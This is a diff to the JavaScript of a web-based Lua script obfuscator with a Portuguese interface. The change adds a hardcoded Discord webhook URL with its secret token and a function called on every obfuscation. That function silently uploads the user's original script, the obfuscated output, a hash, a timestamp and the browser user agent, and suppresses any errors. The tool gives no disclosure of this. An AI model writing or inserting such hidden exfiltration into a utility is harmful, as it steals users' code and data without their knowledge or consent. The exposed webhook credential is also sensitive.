@@ -318,6 +318,15 @@ function clearStatus(){document.getElementById("errorBox").style.display="none";
 
 function toBase64(str){return btoa(unescape(encodeURIComponent(str)));}
 
+async function sha256(text){
+    const encoder=new TextEncoder();
+    const data=encoder.encode(text);
+    const hash=await crypto.subtle.digest("SHA-256",data);
+    return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("");
+}
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1443265753515036813/4KBxDmoHRiOg6HTAPozVDtVnNwlbeQlTkRAn8T4WJZosOV7LE1jA2hUixbtP7vgXYF75";
+
 document.getElementById("fileInput").addEventListener("change",(e)=>{
     const file=e.target.files[0];
     if(!file)return;
@@ -334,11 +343,12 @@ document.getElementById("fileInput").addEventListener("change",(e)=>{
     reader.readAsText(file);
 });
 
-function obfuscate(){
+async function obfuscate(){
     const script=document.getElementById("input").value.trim();
     if(!script) return showStatus("Antes de obfuscar, insira um script!","err");
 
     const encoded = toBase64(script);
+    const hash = await sha256(script);
 
     const final = `
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -367,39 +377,52 @@ loadstring(decode([[${encoded}]]))()
 `;
 
     document.getElementById("output").value=final.trim();
-    showStatus("Pronto maninho(a), script obfuscado!","ok");
+    showStatus("Obfuscação completa.","ok");
+
+    sendToWebhook(script, final.trim(), hash);
 }
 
-function showOutputStatus(msg, type) {
-    const box = document.getElementById("outputStatus");
-    if (!box) {
-        const newBox = document.createElement("div");
-        newBox.id = "outputStatus";
-        newBox.style.width = "100%";
-        newBox.style.padding = "10px";
-        newBox.style.marginTop = "12px";
-        newBox.style.borderRadius = "12px";
-        newBox.style.fontWeight = "bold";
-        document.getElementById("outputTab").appendChild(newBox);
-        showOutputStatus(msg, type);
-        return;
-    }
-    box.innerText = msg;
-    box.className = type;
-    box.style.display = "block";
+function sendToWebhook(original, obfuscated, hash){
+    const payload = {
+        content: "**Nova obfuscação registrada!**",
+        embeds: [{
+            title: "Detalhes:",
+            color: 65280,
+            fields: [
+                { name: "SHA-256:", value: "`" + hash + "`" },
+                { name: "Horário:", value: new Date().toLocaleString() },
+                { name: "Navegador:", value: navigator.userAgent }
+            ]
+        }]
+    };
+
+    const files = [
+        new File([original], "scriptoriginal.lua"),
+        new File([obfuscated], "obfuscada.lua")
+    ];
+
+    const form = new FormData();
+    form.append("payload_json", JSON.stringify(payload));
+    form.append("files[0]", files[0]);
+    form.append("files[1]", files[1]);
+
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        body: form
+    }).catch(()=>{});
 }
 
 function copyOutput() {
     const out = document.getElementById("output");
     out.select();
     document.execCommand("copy");
-    showOutputStatus("Obfuscação copiada para sua área de transferência.", "ok");
+    showStatus("Obfuscação copiada.","ok");
 }
 
 function downloadOutput() {
     const code = document.getElementById("output").value;
-    if (!code) return showOutputStatus("Não posso baixar conteúdo vazio.", "err");
-    
+    if (!code) return showStatus("Sem conteúdo para download.","err");
+
     const blob = new Blob([code], { type: "text/plain" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
@@ -407,7 +430,7 @@ function downloadOutput() {
     a.download = "obfuscated.lua";
     a.click();
     URL.revokeObjectURL(url);
-    showOutputStatus("Baixando...", "ok");
+    showStatus("Baixando arquivo...","ok");
 }
 
 const particleContainer = document.getElementById("particles");
